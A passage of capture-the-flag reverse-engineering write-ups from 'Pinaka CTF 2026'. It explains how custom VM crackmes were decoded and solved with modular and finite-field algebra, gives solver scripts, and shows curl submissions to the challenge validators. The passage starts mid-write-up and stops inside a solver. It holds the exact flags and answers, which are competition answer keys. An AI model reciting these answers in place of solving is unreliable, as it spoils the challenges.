- compiled `pinaka_check.c`: `ACCEPT x=3205865151537252764 == TARGET`

![formal_model.py rejecting the program next to the compiled pinaka_check accepting it](https://cyberhx.com/writeups/cryptonite/rev/16.webp)

## Submission

```
POST /mithila/dhanurbhanga   {"program":"10ffffffffffffffff109d892eb35e857d2c00"}
 ->  {"status":"bow-broken",
   "checker":"ACCEPT x=3205865151537252764 == TARGET",
   "flag":"PINAKA{dhanurbhanga_a_single_uint64_wrap_shatters_shivas_unbreakable_bow}"}
```

## Notes

- A formal proof is only as sound as its model of the machine. The proof reasoned over Z; the implementation ran over Z/2^64Z.
- Because 2^64 isn't divisible by 3, a single overflow breaks the "`x` is always a multiple of 3" invariant.

title: Gurukul: The Silent Instruction
excerpt: The gate wants an eight-byte "mantra" and a trace tag. The firmware checks each mantra byte with one linear equation mod 251, so the mantra can be solved directly and the real emulator supplies the tag.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** reverse engineering
**Flag:** `PINAKA{gurukul_the_silent_instruction_is_sounded}`

## Overview

The gate wants an eight-byte "mantra" and a trace tag. The firmware checks each mantra byte with one linear equation mod 251, so the mantra can be solved directly and the real emulator supplies the tag.

Files:

- `vac_emu`: stripped x86-64 PIE, the VAC emulator
- `firmware.rom`: 904 bytes, the firmware the gate accepts
- `firmware_v1.rom`: decoy variant, 16 code bytes differ
- `calibration.dat`: 1032 bytes, never read by `vac_emu`

```sh
./vac_emu firmware.rom 23 86 21 23 124 206 180 138
```

## Analysis

`vac_emu` is a small VM host. The main loop is at `0x1120` and the trace hashing routine is at `0x2140`. The firmware is a stream of 24-bit instructions. The machine has 4 general registers, an accumulator and a mode register. ROM sits at `0x0000` to `0x03ff`, there are four banks of 256 dwords at `0x4000` to `0x40ff` (selected with `setbank`), some memory-mapped peripherals, and a bell timer that raises an interrupt.

![main fetch/dispatch loop at 0x1120 in the disassembler](https://cyberhx.com/writeups/cryptonite/rev/1.webp)

**State-dependent dispatch.** The same opcode byte means different things depending on the current mode:

```python
seed = [0, 5, 9, 2, 11, 4, 7, 1]
idx = (seed[mode] + (opcode >> 4) * (2 * mode + 1)) & 0xf
```

`idx` 0 to 14 map to:

```
0 nop    1 ldi    2 ld      3 st      4 mov     5 add     6 sub     7 mul
8 xor    9 setmode 10 rd    11 wr     12 jmp    13 jz     14 setbank
```

`idx` 15 is special: low nibble `0` is halt, `1` is ret (pop saved state), anything else is a nop. The opcode's low nibble picks a register `r0` to `r3`. For `mov`, the low nibble is the source and the high nibble is the destination, with 4 meaning the accumulator.

![the dispatch index computation in the binary](https://cyberhx.com/writeups/cryptonite/rev/2.webp)

also: 
- `dword_30C0`: seed table
- `dword_30E0`: multiplier table.

**Base-251 arithmetic.** A 16-bit value is two base-251 digits. `add`, `sub` and `mul` reduce each digit mod 251, and only `xor` is plain 16-bit XOR. Modelling `add` as ordinary 16-bit addition makes the firmware checks unsolvable.

**Peripherals:**

- `rd 0`: next mantra byte
- `rd 1`: bytes remaining
- `rd 2`: sequence `[10, 19, 28]`
- `rd 0x11`: bell value
- `rd 0x31`: activated flag
- `wr 0x10`: bell period, 0 disables
- `wr 0x20`: append a byte to `deepa`
- `wr 0x30`: activate, only when the value is `0xa5`

**Bell timer.** The counter ticks on every retired instruction while enabled and not inhibited. On expiry it pushes `pc`, `mode`, registers, accumulator, bank and the zero flag, forces mode 0, and jumps to `0x380`. That handler reads the bell value and stores it at `bank0[0x10]`, and `ret` clears the inhibit latch and restores the mode. The bell value updates as `v = (v*v + 0x1d) % 251`, starting at `0x3b`.

**Firmware logic.** Mode 0 setup copies `ROM[0x340..0x34f]` into `bank1[0..7]` and `bank2[0..7]`, sets the bell period to 7, and switches to mode 2. Modes 2 and 3 then run eight checks, one per mantra byte:

```
acc = mantra[i] * bank2[i] + bell_i - bank1[i]     (base-251 digits)
```

Any nonzero result sets `r3 = 1`. If all eight are zero, the firmware writes `0xa5` to peripheral `0x30` and `.` to peripheral `0x20`, then halts. The tables:

```
bank1 = [100, 7, 222, 45, 130, 88, 199, 11]
bank2 = [2, 3, 5, 7, 11, 13, 17, 19]      # primes
bell  = [54, 0, 117, 135, 21, 171, 151, 150]
```

## Solution

Each check is a linear congruence mod the prime 251:

```
mantra[i] = (bank1[i] - bell_i) * inverse(bank2[i])  mod 251
```

```python
bank1 = [100, 7, 222, 45, 130, 88, 199, 11]
bank2 = [2, 3, 5, 7, 11, 13, 17, 19]
bell  = [54, 0, 117, 135, 21, 171, 151, 150]

mantra = []
for i in range(8):
    inv = pow(bank2[i], -1, 251)
    mantra.append(((bank1[i] - bell[i]) % 251) * inv % 251)

print(mantra)
# [23, 86, 21, 23, 124, 206, 180, 138]
```

The tag is a SHA-256 over a byte stream: prefix `"VAC1" 0x33 0x00`, one 4-byte record per retired instruction `(pc_hi, pc_lo, dispatch_idx, mode_after)`, the 7-byte marker `00 "DEEPA" 00`, the `deepa` bytes, the activated byte, `0x80`, zero padding to 56 mod 64, and a big-endian 64-bit bit length. The length field excludes the `0x80` byte, so the padding is non-standard. Instead of reimplementing it, run the real emulator:

```sh
./vac_emu firmware.rom 23 86 21 23 124 206 180 138
```

```
activated=1
deepa=2e
tag=fa794a8caf8596350aaa43ba2367385cf904397c85bf52cd0e8d68f20746371e
```

## Submission

```sh
curl -s -X POST https://pinaka-a02-cyber-xo-x.vercel.app/gurukul/activate \
  -H 'Content-Type: application/json' \
  -d '{"mantra":[23,86,21,23,124,206,180,138],"trace_tag":"fa794a8caf8596350aaa43ba2367385cf904397c85bf52cd0e8d68f20746371e"}'
```

```json
{"status":"activated","flag":"PINAKA{gurukul_the_silent_instruction_is_sounded}","proclamation":"The silent instruction is received; the gurukul opens its gate."}
```

## Notes

- `firmware_v1.rom` has 16 different code bytes, nonzero data at `0x1a0+`, and an interrupt handler that stores the bell at `0x40f8` instead of `0x4010`. The recovered mantra doesn't activate it.
- `calibration.dat` is never opened, since `vac_emu` only reads `argv[1]`. It starts with the ASCII header `VCAL`, then `0d 00 00 01`, then 1024 bytes. XORing it with `firmware.rom` doesn't give `firmware_v1.rom`, and it contains neither the mantra nor the bank tables.
- The ROM has a fake flag at `0x300`: `PINAKA{the_spoken_mantra_is_a_decoy_keep_reversing_the_silence}`. The firmware reads the 16 bytes right after it, at `0x340`, as its check tables.

![the decoy flag string sitting in the ROM at 0x300](https://cyberhx.com/writeups/cryptonite/rev/3.webp)

title: Jambavan: The Forgotten Strength
excerpt: jambavanseal is an oracle that reads 0/1 characters from stdin. The goal is a 128-bit "chant" that drives its hidden state to a target sigil.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** reverse engineering
**Flag:** `PINAKA{jambavan_forgotten_strength_learned_from_the_oracle}`

## Overview

`jambavan_seal` is an oracle that reads `0`/`1` characters from stdin. The goal is a 128-bit "chant" that drives its hidden state to a target sigil.

Files:

- `K06_player/jambavan_seal`: stripped x86-64 PIE oracle
- `K06_player/seal_target.json`: the target 128-bit `awakened_sigil`

## Analysis

Every `0` or `1` character advances a hidden 128-bit linear-feedback automaton and emits one resonance bit. The state lives in two 64-bit registers (`r12` low, `rbp` high), and the constants are in the binary:

```
tap1 = 0xca504c4a84c21f09   (AND r12)
tap2 = 0x7f78bc91aa80f7ef   (AND rbp)
tap3 = 0x49fbc9fedff08584   (AND new r12)
tap4 = 0x53b71036898edaf9   (AND new rbp)

feedback = parity(r12 & tap1) ^ parity(rbp & tap2) ^ input_bit
new_r12  = (r12 >> 1) | (rbp << 63)
new_rbp  = (rbp >> 1) | (feedback << 63)
output   = parity(new_r12 & tap3) ^ parity(new_rbp & tap4)
```

The resting state is also in the binary:

```
r12 = 0xb43f4db6aefb5271
rbp = 0x2d54ac7aec3fd6fd
```

![the tap constants and initial state visible in the disassembly](https://cyberhx.com/writeups/cryptonite/rev/5.webp)

## Solution

Shifts, ANDs, parities and XORs are all affine over GF(2), so the whole machine is:

```
S_{i+1} = A*S_i  XOR  b*u_i
y_i     = c*S_{i+1}
```

`S` is the 128-bit state and `u_i` is the input bit. `A` and `b` come from stepping the basis vectors with input `0`. After 128 input bits:

```
S_128 = A^128*S_0  XOR  sum_{i=0..127} A^(127-i)*b*u_i
```

The 128 columns `A^(127-i)*b` form a square 128x128 system over GF(2). Solving it for the target sigil `0x5e0d6ee1d2c86176c52d690679648156` with Gaussian elimination gives the chant.

```python
t1=0xca504c4a84c21f09; t2=0x7f78bc91aa80f7ef
t3=0x49fbc9fedff08584; t4=0x53b71036898edaf9
S0=0xb43f4db6aefb5271 | (0x2d54ac7aec3fd6fd<<64)

def par(x): return bin(x).count('1') & 1

def step(S,bit):
    r12=S&((1<<64)-1); rbp=S>>64
    fb=par(r12&t1)^par(rbp&t2)^bit
    nr12=((r12>>1)|(rbp<<63))&((1<<64)-1)
    nrbp=((rbp>>1)|(fb<<63))&((1<<64)-1)
    out=par(nr12&t3)^par(nrbp&t4)
    return nr12|(nrbp<<64),out

A=[step(1<<i,0)[0] for i in range(128)]
b=step(0,1)[0]
def applyA(S):
    r=0
    for i in range(128):
        if (S>>i)&1: r^=A[i]
    return r

target=int("5e0d6ee1d2c86176c52d690679648156",16)
cols=[b]
for _ in range(127): cols.append(applyA(cols[-1]))
cols=cols[::-1]                      # column for u_i = A^(127-i) b

v=S0
for _ in range(128): v=applyA(v)
rhs=target^v

rows=[]
for eq in range(128):
    row=0
    for i in range(128):
        if (cols[i]>>eq)&1: row|=1<<i
    if (rhs>>eq)&1: row|=1<<128
    rows.append(row)

piv=[]; r=0
for col in range(128):
    p=next((rr for rr in range(r,128) if (rows[rr]>>col)&1), None)
    if p is None: continue
    rows[r],rows[p]=rows[p],rows[r]
    for rr in range(128):
        if rr!=r and ((rows[rr]>>col)&1): rows[rr]^=rows[r]
    piv.append(col); r+=1
sol=0
for k,col in enumerate(piv):
    if (rows[k]>>128)&1: sol|=1<<col
chant=''.join('1' if (sol>>i)&1 else '0' for i in range(128))
```

The solved chant:

```
1000101110000110110010010100110101010011111101001001001100010111
0011110010101001011101101110101000100001111111011100011111000010
```

Feeding it back through the simulated state lands exactly on `0x5e0d6ee1d2c86176c52d690679648156`.

![solver output printing the 128-bit chant and the simulated final state matching the target](https://cyberhx.com/writeups/cryptonite/rev/6.webp)

## Submission

```bash
curl -X POST https://pinaka-k06-cyber-xo-x.vercel.app/seal/awaken \
  -H 'Content-Type: application/json' \
  -d '{"chant":"10001011100001101100100101001101010100111111010010010011000101110011110010101001011101101110101000100001111111011100011111000010"}'
```

```json
{"flag":"PINAKA{jambavan_forgotten_strength_learned_from_the_oracle}",
 "proclamation":"Jambavan remembers his strength; the seal yields",
 "status":"awakened"}
```

## Notes

- The 128x128 system has full rank 128, so the chant is unique and there is nothing to search.
- The step function is easiest to get right by stepping basis vectors with input `0` to build `A`, rather than deriving the matrix by hand.

title: Kumbhakarna: The Machine Beneath Lanka
excerpt: kumbha is a stripped x86-64 binary that turns out to be a tiny 24-bit virtual machine with its ROM embedded in the ELF. The validator wants four 24-bit input words (the "invocation") and the resulting TAG. Rather…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** reverse engineering
**Flag:** `PINAKA{kumbhakarna_wakes_when_y0u_model_the_machine_not_brute_it}`

## Overview

`kumbha` is a stripped x86-64 binary that turns out to be a tiny 24-bit virtual machine with its ROM embedded in the ELF. The validator wants four 24-bit input words (the "invocation") and the resulting `TAG`. Rather than brute-forcing, the check can be run backwards.

Files:

- `kumbha`: stripped x86-64 PIE, the VM host
- `rom.bin`: 780 bytes, 260 24-bit big-endian ROM words
- `traces/trace_0.txt` ... `trace_2.txt`: reference PC/R0 traces for three test invocations

Each trace lists the invocation, the result (`DORMANT`), the final tag, and the PC/R0 pair for every step. They act as an oracle: any VM model that doesn't reproduce them is wrong.

## Analysis

**Finding the ROM.** The binary copies `0x410` bytes from `.rodata` offset `0x2200` into a VM struct in BSS at `0x4080`. That's 260 little-endian dwords, one per ROM word:

```python
import struct
b = open("kumbha", "rb").read()
rom = list(struct.unpack("<260I", b[0x2200:0x2200+0x410]))
```

`rom.bin` is the same data as 3-byte big-endian values. The interesting words:

```
ROM[0x000] = 0x3c0400
ROM[0x001] = 0x00000e
ROM[0x008] = 0x088400    # interrupt service routine
ROM[0x100] = 0xc3b014    # encrypted multiplier 0
ROM[0x101] = 0xa0b682
ROM[0x102] = 0x16ea82
ROM[0x103] = 0xfea221
ROM[0x048] = 0x6e1a93    # comparison constant 0
ROM[0x05e] = 0x69ad85    # comparison constant 1
ROM[0x074] = 0x387eda    # comparison constant 2
ROM[0x08a] = 0xa30740    # comparison constant 3
```

![the memcpy of 0x410 bytes from .rodata 0x2200 into the VM struct](https://cyberhx.com/writeups/cryptonite/rev/17.webp)

**VM architecture:**

- 24-bit words and registers, 8 registers `R0` to `R7`.
- 8 memory banks of 4 KiB, with memory-mapped I/O in bank 0 at `0xF00` and above.
- A single interrupt line, driven by DMA completion and the timer.
- A cycle hash over the machine state, printed as `TAG`.

I/O ports used by this ROM:

- `0x00`: timer reload / countdown
- `0x01`: interrupt enable
- `0x10`: DMA source
- `0x11`: DMA destination
- `0x12`: DMA length
- `0x13`: DMA seed
- `0x14`: DMA bank
- `0x15`: DMA start
- `0x20`: interrupt mask
- `0x30`: LCG state
- `0x31`: step the LCG
- `0x40`: read the next input word
- `0x41`: input available
- `0x50`: signal / output value

**Instruction encoding.** A 24-bit word `w` decodes as:

```python
op = (w >> 18) & 0x3f   # 6-bit opcode
A  = (w >> 15) & 7      # destination / first register
B  = (w >> 12) & 7      # source / second register
f  = (w >> 10) & 3      # immediate mode
r9 = w & 0x3ff          # 10-bit immediate or small offset
```

If `f != 0`, the next ROM word is a 24-bit immediate. The next-PC rule that matches the binary is `nxt = pc + 2 + (1 if (w & 0x800) else 0)`.

Opcodes that matter:

- `5`: add with end-around carry
- `6`: subtract
- `9`: XOR
- `26` / `27`: port read / port write
- `28`: halt
- `31`: XOR the LCG state
- `32`: multiply in GF(2^24)
- `33`: done / report

Two of these aren't what they look like:

- Opcode 32 is not XOR. It's a 24-round shift-and-reduce multiply in GF(2^24) with polynomial `0x100001B`. The shift loop around `0x15C0` gives it away.
- Opcode 5 is not plain addition. It's end-around carry, i.e. addition modulo `2^24 - 1`:

```python
s = a + b
carry = s >> 24
r = ((s & 0xffffff) + carry) & 0xffffff
```

![the shift-and-reduce loop at 0x15C0 with the 0x100001B reduction](https://cyberhx.com/writeups/cryptonite/rev/18.webp)

**Boot and DMA.** Boot code programs a four-word DMA (`source = ROM[0x100]`, `destination = 0x10`, `length = 4`, `seed = 0xC0DE`). The DMA decrypts each word with the same LCG constants used elsewhere:

```python
seed = (seed * 0x19660D + 0x3C6EF3) & 0xffffff
word = ROM[src + i] ^ seed
```

Decrypting `ROM[0x100..0x103]` gives the four multipliers `0x0F1E2D, 0x3C4B5A, 0x678869, 0xA5B4C3`. DMA completion raises the interrupt, which runs the ISR at `ROM[0x08]` and starts the main check.

**The four-block check.** The main routine reads four 24-bit input words from port `0x40` and starts with `R0 = 0x4B554D` ("KUM"). Then it runs four identical blocks. For block `i`:

1. `R0 = R0 + input[i]` with end-around carry.
2. `R0 = R0 * mem[0x10 + i]` in GF(2^24), polynomial `0x100001B`.
3. `R0 = R0 ^ lcg_i`.
4. `R7 = R7 | (R0 ^ const_i)`.

The LCG starts at `0x9A1337` and steps with `state = state * 0x19660D + 0x3C6EF3 mod 2^24`, giving the per-block values `0x1652BE, 0xE45699, 0x46CAB8, 0x920A4B`. The comparison constants are `0x6E1A93, 0x69AD85, 0x387EDA, 0xA30740`.

The ROM signals `AWAKE` only when `R7 == 0`, so every block must finish with `R0 == const_i`. That makes the four equations independent once `R0` is carried forward.

![the four-block loop in the ROM disassembly or an annotated emulator trace](https://cyberhx.com/writeups/cryptonite/rev/19.webp)

## Solution

Work each block backwards:

```
target = const_i ^ lcg_i
q      = target * inverse(mem[i])     in GF(2^24)
input  = q - R0                       modulo 2^24 - 1
```

`R0` for the next block is `const_i`. The GF inverse is `a^(2^24 - 2)`, and subtraction undoes end-around-carry addition. Because the addition is mod `2^24 - 1`, `b = (q - R0) mod (2^24 - 1)` is unique in range, with the usual edge case at `0` / `0xFFFFFF`.

Worked values as `target -> q -> input`:

- block 0: `0x78482D` -> `0xA2A07E` -> `0x574B31`
- block 1: `0x8DFB1C` -> `0xBC81E5` -> `0x4E6752`
- block 2: `0x7EB462` -> `0xAB00BF` -> `0x41533A`
- block 3: `0x310D0B` -> `0xA7EBFB` -> `0x6F6D21`

The solver doesn't need the emulator:

```python
M = 0xffffff
POLY = 0x100001b

def gfmul(a, b):
    a &= M
    b &= M
    r = 0
    for _ in range(24):
        if b & 1:
            r ^= a
        b >>= 1
        a <<= 1
        if a & 0x1000000:
            a ^= POLY
    return r & M

def gfpow(a, e):
    r = 1
    while e:
        if e & 1:
            r = gfmul(r, a)
        a = gfmul(a, a)
        e >>= 1
    return r

def gfinv(a):
    return gfpow(a, (1 << 24) - 2)

def add(a, b):
    s = a + b
    carry = s >> 24
    return ((s & M) + carry) & M

def sub_inv(r, a):
    # find b with add(a, b) == r
    for b in ((r - a) % M, (r - a - 1) % M, (r - a + 1) % M):
        b &= M
        if add(a, b) == r:
            return b
    return None

mem = [0x0f1e2d, 0x3c4b5a, 0x678869, 0xa5b4c3]

lcg = []
s = 0x9a1337
for _ in range(4):
    s = (s * 0x19660d + 0x3c6ef3) & M
    lcg.append(s)

const = [0x6e1a93, 0x69ad85, 0x387eda, 0xa30740]

R0 = 0x4b554d
inputs = []
for i in range(4):
    target = const[i] ^ lcg[i]
    q = gfmul(target, gfinv(mem[i]))
    inp = sub_inv(q, R0)
    inputs.append(inp)
    print(i, hex(inp))
    R0 = const[i]

print(" ".join("%06X" % x for x in inputs))
```

```
0x574b31
0x4e6752
0x41533a
0x6f6d21
574B31 4E6752 41533A 6F6D21
```

The `TAG` is a cycle hash over the machine state, so rather than reproduce it in a custom emulator, run the real binary on the recovered input (on macOS, via Docker):

```sh
docker run --rm --platform linux/amd64 \
  -v "$PWD":/w -w /w ubuntu:24.04 \
  sh -c './kumbha 574B31 4E6752 41533A 6F6D21'
```

```
AWAKE
TAG d1ddfd42
```

## Submission

```sh
curl -s -X POST https://pinaka-kumbhakarna-validator.onrender.com/verify \
  -H 'Content-Type: application/json' \
  -d '{"invocation":"574B31 4E6752 41533A 6F6D21","tag":"d1ddfd42"}'
```

```json
{"flag":"PINAKA{kumbhakarna_wakes_when_y0u_model_the_machine_not_brute_it}","message":"Kumbhakarna stirs. The machine beneath Lanka awakens.","ok":true}
```

## Notes

- Opcode 32 is a GF(2^24) multiply, not XOR. Treating it as XOR gives wrong inputs.
- Addition is end-around carry, not plain mod 2^24. The carry out of bit 23 is added back at bit 0.
- The cycle hash isn't just over `R0`. The loop at `0x127B` hashes `((instruction_word << 8) ^ R0)`. This only matters if you reproduce `TAG` in your own emulator; the `AWAKE` decision doesn't depend on it.
- The invocation is unique, so there's no second solution to search for.
- The ASCII is meaningless: `574B31 4E6752 41533A 6F6D21` reads as `WK1NgRAS:om!`. The validator checks the four words and the tag.

title: Kumbhakarna: The Sleepless Curse
excerpt: The gate (POST /lanka/awaken) wants a six-word summons and a 64-hex attestation:
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** reverse engineering
**Flag:** `PINAKA{kumbhakarna_six_drumbeats_pierce_the_sleep}`

## Overview

The gate (`POST /lanka/awaken`) wants a six-word summons and a 64-hex attestation:

```
{"summons": [b0,b1,b2,b3,b4,b5], "attestation": "<64 hex>"}
```

It opens only when the summons drives the engine's sleep-depth to zero and the attestation equals the tag the real machine emits. The tag is just whatever the emulator prints for a given summons, so only the `awake` condition has to be solved.

Files:

- `prahara_emu`: stripped 18 KB x86-64 PIE that runs a ROM on a custom processor
- `firmware.rom`: 3668 bytes (1834 x 16-bit words) of PRAHARA firmware
- `firmware_debug.rom`: same size, 30 bytes differ
- `dundubhi_cfg.bin`, `vectors.dat`: extra hints the emulator never reads
- `README.md`

```
./prahara_emu firmware.rom <b0> <b1> <b2> <b3> <b4> <b5>
awake=0|1
sleep_depth=<n>
garjana=<hex trace>
tag=<sha256-ish 64 hex>
```

## Analysis

**Recon.** Strings of interest: `DUNDUBHI`, `GARJANA`, `PRANA`, `PRAHARA1`, `awake=%d`, `sleep_depth=%d`, `garjana=`, `tag=`. `.rodata` has a SHA-256 K-table at `0x31c0` and the SHA-256 IV at `0x3330`, so the `tag` is SHA-256 over a transcript. It also has four jump tables for the interpreter.

`main` starts at `0x1100` and:

1. Reads the ROM into `[rsp+0xbf0]` (up to `0x1000` bytes).
2. Zero-extends each 16-bit ROM word into a 32-bit VM word at `[rsp+0x1bf0]` (2048-word instruction memory).
3. Parses `argv[2...]` with `strtol`, masks each to 12 bits, and stores them at `[rsp+0xf0...]`.
4. Zeroes a 256-word data RAM at `[rsp+0x7f0]`.
5. Enters the VM fetch loop at `0x137c`.

![main() in the disassembler showing the ROM load and argv parsing](https://cyberhx.com/writeups/cryptonite/rev/7.webp)

**Fetch and dispatch** at `0x137c`:

```
eax  = code[pc & 0x7ff]
esi  = al                    ; operand (low byte)
op   = (eax >> 8) & 0xf      ; primary opcode (bits 8..11)
```

Primary opcodes `0..14` dispatch through the table at `0x3040`, and opcode `15` is handled by a fall-through path. Three more tables hang off the extended instructions:

- main opcode: `0x3040`, 15 entries -> index `(word>>8)&0xf`
- extended A: `0x307c`, 35 entries -> index `operand - 0x10`
- DUNDUBHI 9-op: `0x3108`, 9 entries -> index `operand`
- DUNDUBHI 35-op: `0x312c`, 35 entries -> index `operand - 0x10`

The extended operand is the table index plus `0x10`: `EXT 0x20` is index `0x10`, `EXT 0x21` is `0x11`, `EXT 0x31` is `0x21`, and so on. Misreading this cost a full debug cycle. Reading the jump tables directly (`lea rdx,[rip+...]` then `base + s32(entry)`) sorted it out.

![the jump table at 0x307c and the lea/base+s32 pattern used to resolve it](https://cyberhx.com/writeups/cryptonite/rev/8.webp)

**The PRAHARA ISA.** The main CPU is a stack machine:

- `0`: `0x13d0` -> NOP (also the common trace-append path)
- `1`: `0x1f4e` -> `PUSH imm`, push next word `& 0xfff`, skip it
- `2`: `0x1efc` -> `LOADCODE`, `top = code[top & 0x7ff]`
- `3`: `0x1eae` -> `LOADDATA`, `top = data[top & 0xff]`
- `4`: `0x20df` -> `STORE`, `data[addr & 0xff] = val` (pop addr, val)
- `5`: `0x209c` -> `ADD = (a + b) % 0xffd`
- `6`: `0x2059` -> `SUB = (a - b) % 0xffd`
- `7`: `0x2013` -> `MUL = (a * b) % 0xffd`
- `8`: `0x21b0` -> stack ops selected by operand (`0` mask/dup, `1` drop, `2` swap, `3` ...)
- `9`: `0x2126` -> `READPORT`, push a special register/port
- `A`: `0x217a` -> `EXT operand`, pop one value, dispatch via `0x307c`
- `B`: `0x1e80` -> conditional branch, if `top == 0` jump to `code[pc+1]`, else skip
- `D`: `0x1db0` -> indirect jump, `pc = code[pc+1]`
- `E`: `0x1f90` -> frame return / restore (used by the drum interrupt)
- `F`: `0x21fb` -> `PUSH data[operand]`

Data RAM is 256 words, and the arithmetic modulus is `0xffd = 4093`, which is prime.

`READPORT` values:

- `0x00`: next summons word (sequential)
- `0x01`: remaining summons count
- `0x11`: drum PRNG value `[rsp+0x34]`
- `0x22`: last DUNDUBHI result `[0x150b0]`
- `0x33`: awake flag `[rsp+0x28]`
- other: 0

Extended ops (operand = index + `0x10`):

- `EXT 0x10`: index `0x00` -> set drum period / enable timer (`0x25f5`)
- `EXT 0x20`: index `0x10` -> set coprocessor multiplier `K` = popped value (`0x2451`)
- `EXT 0x21`: index `0x11` -> emit one byte to the GARJANA buffer and the coprocessor mailbox (`0x23f3`)
- `EXT 0x30`: index `0x20` -> append popped value to the `0x3bf0` trace buffer (`0x23bf`)
- `EXT 0x31`: index `0x21` -> sleep tick, if popped value `== 1` then `sleep_depth -= 30` (`0x2390`)
- `EXT 0x32`: index `0x22` -> awake check, `awake |= (val == 0xace && sleep_depth == 0)` (`0x2472`)

The `0x312c` table is the same family but ignores the operand (uses 0), and is used when the stack is empty.

**The DUNDUBHI coprocessor.** The main CPU talks to it through a mailbox in `.data`:

- `[0x5060]`: command register (initialised to `-1`, meaning idle)
- `[0x5064]`: parameter/accumulator `D`
- `[0x150b8]`: 12-bit accumulator `acc`
- `[0x150b0]`: last result

When the coprocessor is idle, an emitted byte is a coprocessor opcode (table `0x3108`). When a command is pending, the byte is data, and after two bytes a 12-bit word `(byte1 << 8) | byte0` is formed and the command runs.

Coprocessor opcodes:

- `0`: `0x2797` -> reset, `D = 1`, `acc = 0`
- `1`: `0x25df` -> set command 1 (next 2 bytes)
- `2`: `0x25df` -> set command 2
- `3`: `0x27c4` -> `acc = acc^2 % 0xffd`
- `4`: `0x2730` -> `acc = rotl12(acc)` (12-bit rotate left by 1)
- `5`: `0x25df` -> set command 5
- `6`: `0x25df` -> set command 6
- `7`: `0x26ff` -> `acc = (acc + D*K) % 0xffd`
- `8`: `0x27ae` -> publish `result = acc & 0xfff`

Mailbox commands:

- `1`: `acc = (acc + word) % 0xffd`
- `2`: `acc = (acc * word) % 0xffd`
- `5`: `D = word`
- `6`: `D = (D * word) % 0xffd`

Each summons word `K` is therefore pushed through:

```
acc = 0
acc = (acc + A) % p
acc = (acc * B) % p
acc = (acc * acc) % p
acc = (acc + C) % p
acc = rotl12(acc)
acc = (acc + D*K) % p          # K = summons word
result = acc & 0xfff
```

where `A, B, C, D` are fixed per-slot constants emitted by the firmware.

![the DUNDUBHI opcode handlers and mailbox command table in the disassembler](https://cyberhx.com/writeups/cryptonite/rev/9.webp)

**The drum timer.** At boot the firmware does `EXT 0x10` with value `0xd`, enabling a periodic interrupt with period 13. The interpreter counts qualifying instructions, and when the counter reaches the period it saves the current PC/stack frame and runs the handler at VM address `0x600`:

```
0x600: READPORT 0x11      ; drum PRNG value
       PUSH 0
       STORE              ; data[0] = drum_value
       RETURN
```

The drum PRNG is a small state machine on `[rsp+0x34]` and `[rsp+0x38]`: `x = (x^2 + 0x3fd) % 0xffd`, `y = (y + x) % 0xffd`.

The interrupt is driven by instruction count, so it perturbs `data[0]`, which the firmware reads later. But both arms of the per-slot branch execute the same number of instructions, so the drum schedule doesn't depend on the branch outcome. The `data[0]` used by each slot's comparison is therefore fixed and input-independent.

**Validation logic.** The firmware copies six constants from `code[0x700..0x705]` into `data[0x10..0x15]`:

```
data[0x10..0x15] = [1234, 2345, 3456, 400, 1500, 2600]
```

For slot `i` the VM executes (PCs shown for slot 0):

```
0x5c: READPORT 0x22        ; push result_i
0x5d: PUSH data[0]         ; drum value
0x5e: ADD
0x5f: PUSH 0x10+i
0x61: LOADDATA             ; data[0x10+i]
0x62: SUB
0x63: B  -> if top == 0, jump to the tick path (0x6a)
```

The tick is taken exactly when `(result_i + data[0]) % 0xffd == data[0x10+i]`, i.e. `result_i  ==  data[0x10+i] - data[0] (mod 4093)`. The tick path at `0x6a` does `PUSH 1; EXT 0x31`, lowering `sleep_depth` by 30. Six satisfied slots give `6 x 30 = 180`, taking `sleep_depth` from 180 to 0. Finally the firmware pushes `0xace` and runs `EXT 0x32`. That value is hard-coded, so the only real condition is `sleep_depth == 0`.

![the six-slot compare/branch sequence at VM pc 0x5c-0x6a](https://cyberhx.com/writeups/cryptonite/rev/10.webp)

## Solution

Each slot resets the coprocessor (`opcode 0`), so `result_i` depends only on its own `K_i`. With `base_i` as the accumulator before the `D*K` term:

```
base_i = rotl12( ((A_i*B_i % p)^2 % p + C_i) % p )
K_i    = ((data[0x10+i] - data[0] - base_i) mod p) * D_i^-1 mod p
```

Per-slot constants (taken from the `PUSH imm; EXT 0x21` byte stream in the ROM), as `(A, B, C, D) -> target`:

- slot 0: (11, 5, 100, 7) -> 1234
- slot 1: (23, 9, 250, 31) -> 2345
- slot 2: (37, 13, 500, 101) -> 3456
- slot 3: (51, 17, 750, 211) -> 400
- slot 4: (67, 21, 1000, 1009) -> 1500
- slot 5: (83, 25, 1500, 2003) -> 2600

The drum value `data[0]` at each comparison was read live with gdb, breaking at the `PUSH data[0]` VM PCs `93, 165, 237, 309, 381, 453`:

```
data[0] at comparison = [2858, 2899, 1307, 4065, 1670, 2712]
```

A short gdb script does this by breaking on the fetch loop (`main+0x27c`, i.e. `0x137c`) and, when the VM PC is one of those six, reading `data[0]` from `[rsp+0x7f0]`.

![gdb session breaking on the fetch loop and printing data[0] at each of the six comparison PCs](./11.png)

Since `p = 4093` is prime, every `D_i^-1` exists:

```python
p = 0xffd                       # 4093, prime
consts = [1234, 2345, 3456, 400, 1500, 2600]      # data[0x10+i]
data0  = [2858, 2899, 1307, 4065, 1670, 2712]     # data[0] at each comparison
ABCD = [(11,5,100,7), (23,9,250,31), (37,13,500,101),
        (51,17,750,211), (67,21,1000,1009), (83,25,1500,2003)]

def rotl12(x):
    return ((x << 1) | (x >> 11)) & 0xfff

sols = []
for i, (A, B, C, D) in enumerate(ABCD):
    acc = (A * B) % p
    acc = (acc * acc) % p
    acc = (acc + C) % p
    base = rotl12(acc)
    target = (consts[i] - data0[i]) % p
